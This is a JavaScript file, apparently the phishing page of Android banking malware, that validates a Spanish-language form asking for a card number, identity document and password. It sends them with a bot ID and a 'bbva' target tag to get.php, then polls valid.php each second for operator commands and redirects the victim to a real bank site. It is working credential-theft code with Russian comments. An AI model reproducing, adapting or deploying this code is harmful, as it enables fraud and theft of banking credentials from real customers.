document.addEventListener("DOMContentLoaded", function () {
  const form = document.querySelector("#myForm");
  const cardNumber = document.querySelector("#cardNumber");
  const docType = document.querySelector("#docType");
  const docNumber = document.querySelector("#docNumber");
  const password = document.querySelector("#password");
  const submitButton = document.querySelector(".submit-button");

  // Валидация и форматирование номера карты
  cardNumber.addEventListener("input", function () {
    let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    this.value = value.replace(/(.{4})/g, "$1 ").trim();
  });

  docType.addEventListener("change", function () {
    docNumber.value = "";
    switch (this.value) {
      case "DNI":
        docNumber.type = "tel";
        break;
      case "Pasaporte":
      case "CE":
        docNumber.type = "text";
        break;
      default:
        docNumber.type = "text";
        break;
    }
  });
  // Валидация и фильтрация при вводе
  docNumber.addEventListener("input", function () {
    let value = this.value;
    let pattern;
    let maxLength;

    switch (docType.value) {
      case "DNI":
        pattern = /^[0-9]*$/;
        maxLength = 8;
        break;
      case "Pasaporte":
      case "CE":
        pattern = /^[a-zA-Z0-9]*$/;
        maxLength = 11;
        break;
      default:
        pattern = /^.*$/;
        maxLength = 11;
        break;
    }
    // Обрезать значение по максимальной длине
    if (value.length > maxLength) {
      value = value.slice(0, maxLength);
    }

    // Удалить недопустимые символы
    value = value.match(pattern) ? value : value.slice(0, -1);

    this.value = value;
  });

  // Обработка отправки формы
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    let valid = true;
    let errorMessage = "Por favor, corrija los siguientes errores:\n";

    let cardNumValue = cardNumber.value.replace(/ /g, "");
    if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
      valid = false;
      errorMessage +=
        "- Número de tarjeta debe contener exactamente 16 dígitos.\n";
    }

    if (password.value.length < 6 || password.value.length > 20) {
      valid = false;
      errorMessage += "- La contraseña debe tener entre 6 y 20 caracteres.\n";
    }

    let docNumValue = docNumber.value;
    switch (docType.value) {
      case "DNI":
        if (!/^\d+$/.test(docNumValue)) {
          valid = false;
          errorMessage += "- DNI debe contener solo números.\n";
        }
        break;
      case "Pasaporte":
      case "CE":
        if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
          valid = false;
          errorMessage += `- ${docType.value} debe contener entre 4 y 11 caracteres alfanuméricos.\n`;
        }
        break;
    }

    if (valid) {
      sendForm("myForm");
      console.log("Form is valid, proceeding to submission...");
    } else {
      customAlert();
    }
  });

  // Получение модального окна и кнопки закрыть
  const modal = document.getElementById("myModal");
  const closeModalBtn = document.getElementById("popupButton");

  // Открытие модального окна вместо alert
  function showModal() {
    modal.style.display = "flex";
  }

  // Закрытие модального окна при клике на кнопку
  closeModalBtn.addEventListener("click", function () {
    modal.style.display = "none";
  });

  // Закрытие модального окна при клике вне его области
  window.addEventListener("click", function (event) {
    if (event.target === modal) {
      modal.style.display = "none";
    }
  });

  // Замена стандартного alert на модальное окно
  function customAlert() {
    showModal();
  }

  const elementoContacto = document.querySelector(".contacto");

  const elementoUbicanos = document.querySelector(".ubicanos");

  elementoContacto.addEventListener("click", () => {
    Android.clickcallphone();
  });

  elementoUbicanos.addEventListener("click", () => {
    Android.clickopenlocation();
  });

  function sendForm(formid) {
    var form = document.getElementById(formid);

    var formData = new FormData(form);

    var botId = getQueryParam("botid");
    formData.append("botid", botId); //добавляем ботайди
    formData.append("target", "bbva"); //добавляем ботайди

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "get.php", true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // Обработка успешного ответа сервера
        console.log(xhr.responseText);
        sendRequestWithBotId(); // Начинаем отслеживание с сервера
      } else {
        // Обработка ошибок
        console.error(xhr.statusText);
      }
    };
    console.log(formData);
    xhr.send(formData);
  }

  function sendRequestWithBotId() {
    var botId = getQueryParam("botid");

    if (botId) {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "valid.php?botid=" + botId, true);
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          var responseCode = xhr.status;
          if (responseCode === 200) {
            setTimeout(sendRequestWithBotId, 1000); // обновляется эта команда каждую секунду
          } else if (responseCode === 201) {
            window.location.href = "https://interbank.pe"; //редир на интер
          } else if (responseCode === 202) {
            //добавь свой код который при ошибке ебашишь
          } else {
            console.error("Unexpected response code: " + responseCode);
          }
        }
      };
      xhr.send();
    } else {
      console.error("Missing botid parameter");
    }
  }

  function getQueryParam(name) {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }
});
